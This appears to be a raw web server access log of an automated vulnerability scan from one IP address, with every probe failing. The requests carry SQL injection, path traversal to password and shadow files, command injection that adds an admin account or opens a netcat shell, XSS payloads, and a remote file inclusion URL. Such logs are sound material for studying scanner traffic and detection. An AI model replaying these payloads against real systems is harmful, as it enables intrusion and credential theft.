+185.238.32.132 - - [24/Feb/2021 17:23:21] "GET /%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:23:21] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:21] "GET /%20ORDER%20BY%2014--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:21] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:21] "GET /8%20906%20168%2098%2084 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:22] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:22] "GET /%20ORDER%20BY%205--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:22] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:22] "GET /%20HAVING%201%3D1--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:23] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:23] "GET /5106%200400%200000%200008%0913%2F2030 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:23] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:23] "GET /%3B%20ls%20-laR%20%2Fetc HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:23] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:23] "GET /8%20903%20375%2056%2008 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:24] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:24] "GET /8%20906%20260%2045%2091 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:24] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:24] "GET /%22%3B%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:25] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:25] "GET /%26%26%20net%20user%20hacker%20Password1%20%2FADD HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:25] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:25] "GET /%3Caudio%20onerror%3D%22javascript%3Aalert(1)%22%3E%3Csource%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:25] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:25] "GET /%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1-- HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:26] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:26] "GET /%2B7%20499%20346%2097%2042 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:26] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:26] "GET /%20ORDER%20BY%203--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:26] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:26] "GET /8%20969%20765%2079%2077 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:27] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:27] "GET /%26%26%20nc%20-lvvp%204444%20-e%20%2Fbin%2Fsh%20%26 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:27] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:27] "GET /8%20905%20060%2098%2091 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:28] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:23:28] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:28] "GET /%2F..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%2Fpasswd%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:28] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:28] "GET /%2B7%209120990957 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:29] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:29] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Chosts HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:29] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:29] "GET /8%20903%20378%2082%2072 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:30] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:30] "GET /%2F..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:30] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:30] "GET /%20and%20(select%20substring(%40%40version%2C3%2C1))%3D'S' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:30] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:30] "GET /%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2Fetc%2Fshadow HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:31] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:31] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:31] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:31] "GET /%26%20nc%20-lvvp%204444%20-e%20%2Fbin%2Fsh%26 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:31] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:31] "GET /%20ORDER%20BY%2029%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:32] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:32] "GET /%20AND%201%3D1%20AND%20'%25'%3D' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:32] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:32] "GET /8%20901%20499%2020%2059 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:33] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:33] "GET /'%20%26%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:33] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:33] "GET /%20ORDER%20BY%2011%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:33] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:33] "GET /%2B79033494172 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:34] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:34] "GET /%20ORDER%20BY%2026%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:34] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:34] "GET /%2B37166064923 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:35] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:35] "GET /%20OR%203409%3D3409%20AND%20('pytW'%20LIKE%20'pytW HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:35] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:23:35] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:35] "GET /%2B7%209241292206 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:36] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:36] "GET /%2B79643911310 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:36] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:36] "GET /%20ORDER%20BY%2012--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:37] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:37] "GET /%20OR%201%3D1--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:37] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:37] "GET /%26%26%20ipconfig%20%2Fall HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:37] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:37] "GET /%20ORDER%20BY%206%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:38] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:38] "GET /%2Fetc%2Fshadow%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:38] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:38] "GET /%26%26%20ls%20-l%20%2Ftmp HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:38] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:38] "GET /%2Fproc%2Fversion HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:39] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:39] "GET /89048611998 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:39] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:23:40] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:40] "GET /%20ORDER%20BY%2020%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:40] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:40] "GET /%26%26%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:40] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:40] "GET /%26%26%20type%20C%3A%5CWindows%5Crepair%5CSAM HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:41] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:41] "GET /%20ORDER%20BY%201--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:41] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:41] "GET /%20ORDER%20BY%2012%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:42] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:42] "GET /%2B79033788680 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:42] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:42] "GET /%2B7495%20128-14-92 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:42] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:42] "GET /%20ORDER%20BY%2022%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:43] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:43] "GET /%3Cinput%20autofocus%20onfocus%3Dalert(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:43] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:43] "GET /%20ORDER%20BY%2027--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:43] "GET /%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:23:44] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:44] "GET /'%3B%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:44] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:44] "GET /8%20906%20455%2093%2059 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:45] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:45] "GET /%26%26%20type%20%25SYSTEMROOT%25%5Crepair%5CSAM HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:45] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:45] "GET /%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2Fetc%2Fpasswd HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:45] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:45] "GET /%2Fproc%2Fcmdline HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:46] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:46] "GET /%26%20ls%20-laR%20%2Fvar%2Fwww HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:46] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:46] "GET /%20WHERE%201%3D1%20AND%201%3D0 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:47] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:47] "GET /%20ORDER%20BY%2014%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:47] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:47] "GET /%3Csvg%2Fonload%3Dalert(%2FINJECTX%2F)%3E HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:47] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:47] "GET /%26%26%20net%20localgroup%20Administrators%20hacker%20%2FADD HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:48] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:48] "GET /%20ORDER%20BY%204%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:48] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:48] "GET /%20ORDER%20BY%207--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:48] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:48] "GET /%26%20ls%20-l%20%2Fvar%2Fwww%2F* HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:49] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:23:49] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:49] "GET /%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:50] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:50] "GET /%2B7%20903%20119-33-45 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:50] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:50] "GET /%20and%20(select%20substring(%40%40version%2C3%2C1))%3D'c' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:50] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:50] "GET /%26%26%20ls%20-l%20%2Fhome%2F* HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:51] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:51] "GET /5100%207050%200000%200002%0913%2F1945 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:51] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:51] "GET /%2Fetc%2Fmysql%2Fmy.cnf HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:52] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:52] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:52] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:52] "GET /8%20906%20260%2048%2022 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:52] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:52] "GET /%3Cselect%20autofocus%20onfocus%3Dalert(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:53] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:53] "GET /%20ORDER%20BY%202%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:53] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:53] "GET /%2B74983013355 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:54] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:54] "GET /%2Fetc%2Fshadow HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:54] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:54] "GET /%20onmouseover%3D%22document.cookie%3Dtrue%3B%22%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:54] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:54] "GET /exe.tar.gz HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:55] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:55] "GET /%20ORDER%20BY%2013%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:55] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:55] "GET /%2B7%209122903074 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:55] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:55] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:56] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:56] "GET /%5C..%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:56] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:56] "GET /%26%26%20sleep%205 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:57] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:57] "GET /%2Fproc%2Fself%2Fenviron HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:57] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:57] "GET /http%3A%2F%2Fxerosecurity.com%2F.testing%2Frfi_vuln.php%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:57] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:57] "GET /%20WHERE%201%3D1%20AND%201%3D1 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:58] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:58] "GET /%20ORDER%20BY%2021--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:58] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:58] "GET /%26%26%20ls%20-l%20%2Fvar%2Fwww%2F* HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:59] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:59] "GET /%26%20pwd HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:59] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:59] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:23:59] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:23:59] "GET /4222222222222 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:00] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:00] "GET /%22%20%26%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:00] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:00] "GET /%26%26%20ls%20-l%20%2F HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:00] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:00] "GET /%2B4578737328 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:01] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:01] "GET /%20ORDER%20BY%2031337%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:01] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:01] "GET /%20ORDER%20BY%2019%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:02] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:02] "GET /%2B79061797042 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:02] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:02] "GET /%2B%207499%20564%2044%2092 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:02] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:02] "GET /%2B79118538201 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:03] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:03] "GET /%26%26%20net%20view HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:03] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:03] "GET /%2B73432282478 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:04] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:04] "GET /2222%204000%205000%200009%0933%2F2030 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:04] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:04] "GET /%20ORDER%20BY%2018--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:04] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:04] "GET /%2B74953741758 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:05] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:05] "GET /%25'%20AND%208310%3D8311%20AND%20'%25'%3D' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:05] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:05] "GET /%26%26%20pwd HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:06] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:06] "GET /%20ORDER%20BY%2022--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:06] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:06] "GET /%20AND%201083%3D1083%20AND%20(1427%3D1427 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:06] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:06] "GET /%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:07] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:07] "GET /%26%26%20type%20C%3A%5CWindows%5Crepair%5CSYSTEM HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:07] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:07] "GET /C%3A%5Cboot.ini HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:08] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:08] "GET /%20and%20(select%20substring(%40%40version%2C1%2C1))%3D'X' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:08] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:08] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:08] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:08] "GET /%20ORDER%20BY%2023--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:09] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:09] "GET /8%20905%20202%2062%2004 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:09] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:09] "GET /%2B7%209260687732 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:10] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:10] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:10] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:10] "GET /%20ORDER%20BY%2015%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:10] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:10] "GET /%2F..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%2Fshadow HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:11] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:24:11] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:11] "GET /%20AND%201%3D1 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:12] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:12] "GET /OR%201%3D1 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:12] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:12] "GET /%20ORDER%20BY%2024%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:12] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:12] "GET /%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:13] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:13] "GET /%20ORDER%20BY%207%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:13] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:13] "GET /%2B74995860591 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:13] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:13] "GET /%20AND%201%3D0--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:14] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:14] "GET /%20ORDER%20BY%2022%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:14] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:14] "GET /%3Cscript%3E%24%3D1%2Calert(%24)%3C%2Fscript%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:15] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:15] "GET /%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2Fboot.ini%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:15] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:24:15] code 404, message File not found
